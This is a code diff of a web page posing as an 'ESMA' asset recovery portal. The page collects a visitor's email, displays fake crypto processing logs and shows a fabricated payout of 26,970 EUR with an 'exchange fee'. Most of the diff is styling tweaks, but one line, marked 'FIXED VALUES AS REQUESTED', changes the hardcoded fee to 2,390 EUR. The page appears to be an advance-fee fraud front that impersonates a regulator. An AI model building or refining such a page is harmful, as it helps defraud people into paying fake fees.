@@ -6,6 +6,11 @@
     <title>ESMA | Asset Recovery & Provisioning Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         :root {
             --bg: #0a0b0d;
             --card: #16181d;
@@ -26,9 +31,10 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 20px;
         }
 
-        .container { width: 100%; max-width: 500px; padding: 20px; }
+        .container { width: 100%; max-width: 500px; padding: 0; }
 
         .console-card {
             background: var(--card);
@@ -87,6 +93,7 @@
         }
 
         h1 { font-size: 20px; font-weight: 700; margin: 0 0 10px 0; }
+        p { color: #666; font-size: 13px; margin-bottom: 30px; }
         
         .input-box { margin-bottom: 25px; }
         label { display: block; font-size: 11px; color: #666; margin-bottom: 8px; text-transform: uppercase; font-weight: 700; }
@@ -98,7 +105,7 @@
             border-radius: 12px;
             padding: 16px;
             color: var(--gold);
-            font-family: 'JetBrains Mono';
+            font-family: 'JetBrains Mono', monospace;
             font-size: 13px;
             box-sizing: border-box;
             transition: 0.3s;
@@ -122,7 +129,7 @@
         #loader-view, #result-view, #bank-view, #final-view { display: none; }
 
         .crypto-logs {
-            font-family: 'JetBrains Mono';
+            font-family: 'JetBrains Mono', monospace;
             font-size: 11px;
             color: #555;
             text-align: left;
@@ -143,7 +150,7 @@
             text-align: center;
             margin-bottom: 25px;
         }
-        .status-label { font-family: 'JetBrains Mono'; font-weight: 800; color: var(--success); font-size: 14px; }
+        .status-label { font-family: 'JetBrains Mono', monospace; font-weight: 800; color: var(--success); font-size: 14px; }
 
         .data-table { margin-bottom: 25px; }
         .data-row {
@@ -176,7 +183,7 @@
             box-shadow: 0 10px 30px rgba(255, 204, 0, 0.1);
         }
         
-        .support-action-card b { color: var(--gold); font-family: 'JetBrains Mono'; font-size: 16px; }
+        .support-action-card b { color: var(--gold); font-family: 'JetBrains Mono', monospace; font-size: 16px; }
         
         .support-email-link {
             display: inline-block;
@@ -216,7 +223,7 @@
 
         <div id="check-view">
             <h1>Access Recovery Portal</h1>
-            <p style="color: #666; font-size: 13px; margin-bottom: 30px;">Enter your registered email to synchronize assets.</p>
+            <p>Enter your registered email to synchronize assets.</p>
             <div class="input-box">
                 <label>Email Address</label>
                 <input type="email" id="client-email" placeholder="email@example.com" autocomplete="off">
@@ -265,7 +272,7 @@
             <h1>Transaction Summary</h1>
             <div class="data-table">
                 <div class="data-row"><span>Beneficiary</span><span id="final-name"></span></div>
-                <div class="data-row"><span>Target IBAN</span><span id="final-iban" style="font-family:'JetBrains Mono'; font-size:11px;"></span></div>
+                <div class="data-row"><span>Target IBAN</span><span id="final-iban" style="font-family:'JetBrains Mono', monospace; font-size:11px;"></span></div>
                 <div class="data-row"><span>Payout Amount</span><span id="final-eur"></span></div>
                 <div class="data-row"><span>Exchange Fee</span><span id="final-fee" style="color: var(--error);"></span></div>
             </div>
@@ -305,7 +312,7 @@
 
         // FIXED VALUES AS REQUESTED
         globalEur = 26970.00; 
-        globalFee = 3263.37;
+        globalFee = 2390.00;   // ← changed to 2 390 ERU (EUR)
         
         globalEth = (globalEur / currentEthPriceEuro).toFixed(4); 
 
